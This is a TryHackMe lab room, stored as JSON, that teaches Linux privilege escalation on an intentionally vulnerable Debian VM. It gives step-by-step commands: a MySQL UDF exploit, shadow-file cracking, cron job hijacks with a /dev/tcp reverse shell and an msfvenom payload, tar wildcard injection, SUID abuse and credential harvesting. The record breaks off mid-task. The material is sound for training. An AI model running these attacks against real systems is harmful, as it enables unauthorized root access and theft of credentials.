{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/d9ff4d8d845ecec00615d68b770e8d4b.jpeg', 'title': 'Linux PrivEsc', 'description': 'Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321', 'code': 'linuxprivesc', 'users': 80428, 'tags': ['privesc', 'privilege escalation', 'linux', 'linux privilege escalation', 'tib3rius'], 'type': 'walkthrough', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 3607, 'created': '2020-05-18T15:20:44.848Z', 'published': '2020-05-18T22:41:36.807Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://i.imgur.com/RuMC2vG.png', 'creator': 'Tib3rius', 'tasks': [{'taskTitle': 'Deploy the Vulnerable Debian VM', 'taskDesc': '<p>This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by\xa0<span style="font-size:1rem;color:rgb(33, 37, 41)">Sagi Shahar as part of his <a href="https://github.com/sagishahar/lpeworkshop" target="_blank">local privilege escalation workshop</a>\xa0but has been updated by <a href="https://twitter.com/TibSec" target="_blank">Tib3rius</a> as part of his <a href="https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06" target="_blank">Linux Privilege Escalation for OSCP and Beyond!</a> course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.</span></p><p><b>Make sure you are connected to the <a href="https://tryhackme.com/access" target="_blank">TryHackMe VPN</a>\xa0or using the in-browser Kali instance before trying to access the Debian VM!</b></p><p>SSH should be available on port 22. You can login to the "user" account using the following command:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">ssh user@MACHINE_IP</code></p><p>If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type <b>yes</b>\xa0and press <b>Enter</b>.</p><p>The password for the "user" account is "<b>password321</b>".</p><p><b>Note:</b> If you get an error saying<b>\xa0</b><code>Unable to negotiate with &lt;IP&gt; port 22: no matching how to key type found. Their offer: ssh-rsa, ssh-dss</code> this is because OpenSSH have deprecated ssh-rsa. Add <code>-oHostKeyAlgorithms=+ssh-rsa</code> to your command to connect.</p><p>The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. <b>Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!</b></p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2020-05-15T15:51:41.739Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5ebeb02b6d6a6b06c3e8e2a6', 'questions': [{'questionNo': 1, 'question': '<p>Deploy the machine and login to the "user" account using SSH.</p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Run the "id" command. What is the result?</p>', 'hint': ''}]}, {'taskTitle': 'Service Exploits', 'taskDesc': '<p>The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a <a href="https://www.exploit-db.com/exploits/1518" target="_blank">popular exploit</a> that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.</p><p>Change into the /home/user/tools/mysql-udf directory:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">cd /home/user/tools/mysql-udf</code></p><p>Compile the\xa0raptor_udf2.c exploit code using the following commands:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">gcc -g -c raptor_udf2.c -fPIC<br />gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br /></code></p><p>Connect to the MySQL service as the root user with a blank password:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">mysql -u root</code><br /></p><p>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:</p><p><code style="background-color:rgb(0, 0, 0);"><span style="color:rgb(0, 255, 0);">use mysql;</span><br /><span style="color:rgb(0, 255, 0);">create table foo(line blob);</span><br /><span style="color:rgb(0, 255, 0);">insert into foo values(load_file(\'/home/user/tools/mysql-udf/raptor_udf2.so\'));</span><br /><span style="color:rgb(0, 255, 0);">select * from foo into dumpfile \'/usr/lib/mysql/plugin/raptor_udf2.so\';</span><br /><span style="color:rgb(0, 255, 0);">create function do_system returns integer soname \'raptor_udf2.so\';</span></code></p><p></p><p>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">select do_system(\'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash\');</code></p><p>Exit out of the MySQL shell (type <b>exit</b>\xa0or <b>\\q</b>\xa0and press <b>Enter</b>) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/tmp/rootbash -p</code></p><p><b>Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!</b></p>\n<p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">rm /tmp/rootbash<br />exit</code></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2020-05-15T16:56:56.227Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.</p>', 'hint': ''}]}, {'taskTitle': 'Weak File Permissions - Readable /etc/shadow', 'taskDesc': '<p>The /etc/shadow file contains user password hashes and is usually readable only by the root user.</p><p>Note that the /etc/shadow file on the VM is world-readable:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">ls -l /etc/shadow</code></p><p>View the contents of the /etc/shadow file:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">cat /etc/shadow</code></p><p>Each line of the file represents a user. A user\'s password hash (if they have one) can be found between the first and second colons (:) of each line.</p><p>Save the root user\'s hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p><p>Switch to the root user, using the cracked password:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">su root</code></p><p><b>Remember to exit out of the root shell before continuing!</b></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2020-05-15T18:59:56.960Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "<p>What is the root user's password hash?</p>", 'hint': ''}, {'questionNo': 2, 'question': "<p>What hashing algorithm was used to produce the root user's password hash?<br /></p>", 'hint': 'john the ripper should automatically identify it when cracking!'}, {'questionNo': 3, 'question': '<p><span style="font-size:1rem;">What is the root user\'s password?</span></p>', 'hint': ''}]}, {'taskTitle': 'Weak File Permissions - Writable /etc/shadow', 'taskDesc': '<p style="margin-bottom:1rem;">The /etc/shadow file contains user password hashes and is usually readable only by the root user.</p><div><p style="margin-bottom:1rem;">Note that the /etc/shadow file on the VM is world-writable:</p></div><div><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">ls -l /etc/shadow</code></p><p style="margin-bottom:1rem;">Generate a new password hash with a password of your choice:</p><p style="margin-bottom:1rem;"><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">mkpasswd -m sha-512 newpasswordhere</code><br /></p><p style="margin-bottom:1rem;">Edit the /etc/shadow file and replace the original root user\'s password hash with the one you just generated.</p><p style="margin-bottom:1rem;color:rgb(33, 37, 41);">Switch to the root user, using the new password:</p><p style="margin-bottom:1rem;"><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">su root</code><span style="color:rgb(33, 37, 41);"></span><br /></p></div><p><span style="font-weight:bolder;">Remember to exit out of the root shell before continuing!</span></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2020-05-15T21:12:23.004Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.</p>', 'hint': ''}]}, {'taskTitle': 'Weak File Permissions - Writable /etc/passwd', 'taskDesc': '<p></p><p>The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.</p><p>Note that the /etc/passwd file is world-writable:</p><p><code style="background-color:rgb(66, 66, 66);color:rgb(0, 255, 0);">ls -l /etc/passwd</code></p><p style="margin-bottom:1rem;">Generate a new password hash with a password of your choice:</p><p style="margin-bottom:1rem;"><code style="color:rgb(0, 255, 0);background-color:rgb(66, 66, 66);">openssl passwd newpasswordhere</code><span style="font-size:1rem;"></span></p><p style="margin-bottom:1rem;"><span style="font-size:1rem;">Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user\'s row (replacing the "x").</span></p><p style="margin-bottom:1rem;color:rgb(33, 37, 41);">Switch to the root user, using the new password:</p><code style="color:rgb(0, 255, 0);background-color:rgb(66, 66, 66);">su root</code><p></p><p>Alternatively, copy the root user\'s row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash\xa0<span style="font-size:1rem;">between the first and second colon (replacing the "x").</span><span style="font-size:1rem;"><br /></span></p><p><span style="font-size:1rem;">Now switch to the newroot user, using the new password:</span></p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">su newroot</code><span style="font-size:1rem;"></span></p><p><span style="font-weight:bolder;">Remember to exit out of the root shell before continuing!</span></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2020-05-15T21:27:33.844Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Run the "id" command as the newroot user. What is the result?</p>', 'hint': ''}]}, {'taskTitle': 'Sudo - Shell Escape Sequences', 'taskDesc': '<p>List the programs which sudo allows your user to run:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">sudo -l</code></p><p>Visit GTFOBins (<a href="https://gtfobins.github.io" target="_blank">https://gtfobins.github.io</a>) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.</p><p>Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.</p><p>For an extra challenge, try to gain a root shell using all the programs on the list!</p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2020-05-15T21:58:11.133Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>How many programs is "user" allowed to run via sudo?\xa0</p>', 'hint': ''}, {'questionNo': 2, 'question': "<p>One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?</p>", 'hint': ''}, {'questionNo': 3, 'question': '<p>Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.</p>', 'hint': 'Play around with certain options the program has!'}]}, {'taskTitle': 'Sudo - Environment Variables', 'taskDesc': '<p>Sudo can be configured to inherit certain environment variables from the user\'s environment.</p><p>Check which environment variables are inherited (look for the env_keep options):</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">sudo -l</code></p><p>LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user\'s environment.\xa0<span style="font-size:1rem;">LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.</span></p><p><span style="font-size:1rem;">Create a shared object using the code located at /home/user/</span>tools/sudo/preload.c:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so\xa0/home/user/tools/sudo/preload.c</code><span style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);"></span></p><p>Run one of the programs you are allowed to run via sudo (listed when running <b>sudo -l</b>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sudo LD_PRELOAD=/tmp/preload.so program-name-here</code></p><p>A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.</p><p>Run ldd against the apache2 program file to see which shared libraries are used by the program:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">ldd /usr/sbin/apache2</code></p><p>Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c<span style="font-size:1rem;">:</span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</code></p><p>Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sudo LD_LIBRARY_PATH=/tmp apache2</code></p><p>A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt<span style="font-size:1rem;">.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the\xa0</span><span style="font-size:1rem;">library_path.c code could be changed to make it work.</span></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2020-05-15T22:26:29.945Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.</p>', 'hint': ''}]}, {'taskTitle': 'Cron Jobs - File Permissions', 'taskDesc': '<p>Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.\xa0Cron table files (crontabs) store the configuration for cron jobs.\xa0<span style="font-size:1rem">The system-wide crontab is located at /etc/crontab.</span></p><p>View the contents of the system-wide crontab:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0)">cat /etc/crontab</code></p><p>There should be two cron jobs scheduled to run every minute. One runs\xa0overwrite.sh, the other runs\xa0/usr/local/bin/compress.sh.</p><p>Locate the full path of the overwrite.sh file:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">locate overwrite.sh</code><span style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)"></span></p><p>Note that the file is world-writable:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">ls -l /usr/local/bin/overwrite.sh</code></p><p>Replace the contents of the\xa0<span style="font-size:1rem">overwrite.sh\xa0</span><span style="font-size:1rem">file with the following after changing the IP address to that of your Kali box.</span></p><p style="padding:5px;background-color:rgb(206, 198, 206)">#!/bin/bash<br />bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</p><p>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn\'t recheck the permissions of the file, is anything missing?</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0)">nc -nvlp 4444</code></p><p><span style="font-weight:700">Remember to exit out of the root shell and remove the reverse shell code before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2020-05-16T04:30:35.774Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.</p>', 'hint': ''}]}, {'taskTitle': 'Cron Jobs - PATH Environment Variable', 'taskDesc': '<p><span style="font-size:1rem;">View the contents of the system-wide crontab:</span><br /></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">cat /etc/crontab</code></p><p>Note that the PATH variable starts with\xa0<b>/home/user</b> which is our user\'s home directory.</p><p>Create a file called <b>overwrite.sh</b> in your home directory with the following contents:</p><p style="padding:5px;background-color:rgb(206, 198, 206);">#!/bin/bash<br /><br />cp /bin/bash /tmp/rootbash<br />chmod +xs /tmp/rootbash</p><p>Make sure that the file is executable:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">chmod +x /home/user/overwrite.sh</code></p><p>Wait for the cron job to run (should not take longer than a minute).\xa0<span style="font-size:1rem;">Run the /tmp/rootbash command with -p to gain a shell running with root privileges:</span></p><p></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/tmp/rootbash -p</code></p><p><span style="font-weight:bold;">Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</span></p>\n<p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">rm /tmp/rootbash<br />exit</code></p>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2020-05-16T05:35:58.032Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What is the value of the PATH variable in /etc/crontab?</p>', 'hint': ''}]}, {'taskTitle': 'Cron Jobs - Wildcards', 'taskDesc': '<p>View the contents of the other cron job script:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">cat /usr/local/bin/compress.sh</code></p><p>Note that the tar command is being run with a wildcard (*) in your home directory.</p><p>Take a look at the GTFOBins page for <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">tar</a>. Note that tar has command line options that let you run other commands as part of a checkpoint feature.</p><p>Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</code></p><p>Transfer the shell.elf file to <b>/home/user/</b> on the Debian VM (you can use <b>scp</b>\xa0or host the file on a webserver on your Kali box and use <b>wget</b>). Make sure the file is executable:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">chmod +x /home/user/shell.elf</code></p><p>Create these two files in /home/user:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">touch /home/user/--checkpoint=1<br />touch /home/user/--checkpoint-action=exec=shell.elf</code></p><p><span style="font-size:1rem;">When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.</span></p><p>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.<span style="font-size:1rem;"><br /></span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">nc -nvlp 4444</code><br /></p><p><span style="font-weight:bold;"><span style="font-size:1rem;">Remember to exit out of the root shell </span>and delete all the files you created to prevent the cron job from executing again:</span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">rm /home/user/shell.elf<br />rm /home/user/--checkpoint=1<br />rm /home/user/--checkpoint-action=exec=shell.elf</code><br /></p>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2020-05-17T14:31:38.985Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.</p>', 'hint': ''}]}, {'taskTitle': 'SUID / SGID Executables - Known Exploits', 'taskDesc': '<p>Find all the SUID/SGID executables on the Debian VM:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2&gt; /dev/null</code></p><p>Note that\xa0/usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim.\xa0<a href="https://www.exploit-db.com/" target="_blank">Exploit-DB</a>,\xa0Google, and GitHub are good places to search!</p><p>A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at\xa0<b>/home/user/tools/suid/exim/cve-2016-1531.sh</b>.</p><p>Run the exploit script to gain a root shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/home/user/tools/suid/exim/cve-2016-1531.sh</code><br /></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 11, 'taskCreated': '2020-05-17T14:47:15.273Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'SUID / SGID Executables - Shared Object Injection', 'taskDesc': '<p>The\xa0<b>/usr/local/bin/suid-so</b> SUID executable is vulnerable to shared object injection.</p><p>First, execute the file and note that currently it displays a progress bar before exiting:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">/usr/local/bin/suid-so</code><br /></p><p>Run <b>strace</b> on the file and search the output for open/access calls and for "no such file" errors:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such file"</code></p><p>Note that the executable tries to load the <span style="font-weight:bold;">/home/user/.config/libcalc.so</span> shared object within our home directory, but it cannot be found.</p><p>Create the <b>.config</b> directory for the libcalc.so file:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">mkdir /home/user/.config</code></p><p>Example shared object code can be found at <b>/home/user/tools/suid/libcalc.c</b>. It simply spawns a Bash shell. Compile the code into a shared object at the location the <b>suid-so</b> executable was looking for it:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">gcc -shared -fPIC -o /home/user/.config/libcalc.so\xa0/home/user/tools/suid/libcalc.c</code></p><p>Execute the <b>suid-so</b> executable again, and note that this time, instead of a progress bar, we get a root shell.</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/usr/local/bin/suid-so</code><br /></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 12, 'taskCreated': '2020-05-18T01:03:13.303Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'SUID / SGID Executables - Environment Variables', 'taskDesc': '<p>The <b>/usr/local/bin/suid-env</b> executable can be exploited due to it inheriting the user\'s PATH environment variable and attempting to execute programs without specifying an absolute path.</p><p>First, execute the file and note that it seems to be trying to start the apache2 webserver:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">/usr/local/bin/suid-env</code></p><p>Run strings on the file to look for strings of printable characters:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">strings /usr/local/bin/suid-env</code></p><p>One line ("service apache2 start") suggests that the <span style="font-weight:bold;">service</span> executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.</p><p>Compile the code located at\xa0<span style="font-weight:bold;">/home/user/tools/suid/service.c</span> into an executable called <span style="font-weight:bold;">service</span>. This code simply spawns a Bash shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">gcc -o service /home/user/tools/suid/service.c</code></p><p>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the\xa0<span style="font-weight:bolder;">suid-env</span>\xa0executable to gain a root shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">PATH=.:$PATH /usr/local/bin/suid-env</code><span style="font-size:1rem;"></span><br /></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 13, 'taskCreated': '2020-05-18T01:29:13.275Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'SUID / SGID Executables - Abusing Shell Features (#1)', 'taskDesc': '<p>The\xa0<span style="font-weight:bolder;">/usr/local/bin/suid-env2</span>\xa0executable is identical to\xa0<span style="font-weight:700;font-size:1rem;">/usr/local/bin/suid-env</span><span style="font-size:1rem;">\xa0except that it</span><span style="font-size:1rem;">\xa0uses the absolute path of the service executable (</span>/usr/sbin/service) to start the apache2 webserver.</p><p>Verify this with strings:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">strings /usr/local/bin/suid-env2<br /></code></p><p>In Bash versions\xa0<span style="font-weight:bold;">&lt;4.2-048</span> it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.</p><p>Verify the version of Bash installed on the Debian VM is less than 4.2-048:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/bin/bash --version</code><span style="font-size:1rem;"></span></p><p>Create a Bash function with the name "<span style="font-weight:bold;">/usr/sbin/service</span>" that executes a new Bash shell (using -p so permissions are preserved) and export the function:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">function /usr/sbin/service { /bin/bash -p; }<br />export -f /usr/sbin/service</code><span style="font-size:1rem;"></span></p><p>Run the <span style="font-weight:bold;">suid-env2</span> executable to gain a root shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/usr/local/bin/suid-env2</code><span style="font-size:1rem;"></span><br /></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 14, 'taskCreated': '2020-05-18T05:27:05.806Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'SUID / SGID Executables - Abusing Shell Features (#2)', 'taskDesc': '<p>Note: This will not work on Bash versions 4.4 and above.</p><p><span style="font-size:1rem;">When in debugging mode, Bash uses the environment variable <b>PS4</b> to display an extra prompt for debugging statements.</span><br /></p><p>Run the <b>/usr/local/bin/suid-env2</b> executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">env -i SHELLOPTS=xtrace PS4=\'$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)\' /usr/local/bin/suid-env2</code></p><p>Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/tmp/rootbash -p</code></p><p><span style="font-weight:bold;">Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">rm /tmp/rootbash<br />exit</code></p>', 'taskType': 'none', 'taskNo': 15, 'taskCreated': '2020-05-18T05:50:50.826Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'Passwords & Keys - History Files', 'taskDesc': '<p>If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.</p><p>View the contents of all the hidden history files in the user\'s home directory:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">cat ~/.*history | less</code></p><p>Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!</p><p>Switch to the root user, using the password:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">su root</code><br /></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 16, 'taskCreated': '2020-05-18T19:52:22.322Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What is the full mysql command the user executed?</p>', 'hint': ''}]}, {'taskTitle': 'Passwords & Keys - Config Files', 'taskDesc': '<p>Config files often contain passwords in plaintext or other reversible formats.</p><p>List the contents of the user\'s home directory:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">ls /home/user</code></p><p>Note the presence of a\xa0<b>myvpn.ovpn</b> config file. View the contents of the file:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">cat /home/user/myvpn.ovpn</code></p><p>The file should contain a reference to another location where the root user\'s credentials can be found. Switch to the root user, using the credentials:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">su root</code><br /></p><p><span style="font-weight:700;">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 17, 'taskCreated': '2020-05-18T19:56:09.618Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "<p>What file did you find the root user's credentials in?\xa0 \xa0</p>", 'hint': ''}]}, {'taskTitle': 'Passwords &amp; Keys - SSH Keys', 'taskDesc': '<p>Sometimes users make backups of important files but fail to secure them with the correct permissions.</p><p>Look for hidden files &amp; directories in the system root:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0)">ls -la /</code></p><p>Note that there appears to be a hidden directory called <b>.ssh</b>. View the contents of the directory:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">ls -l /.ssh</code></p><p>Note that there is a world-readable file called <b>root_key</b>. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.</p><p>Copy the key over to your Kali box (it\'s easier to just view the contents of the <b>root_key</b>\xa0file and copy/paste the key)\xa0and give it the correct permissions, otherwise your SSH client will refuse to use it:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">chmod 600 root_key</code></p><p>Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP</code><br 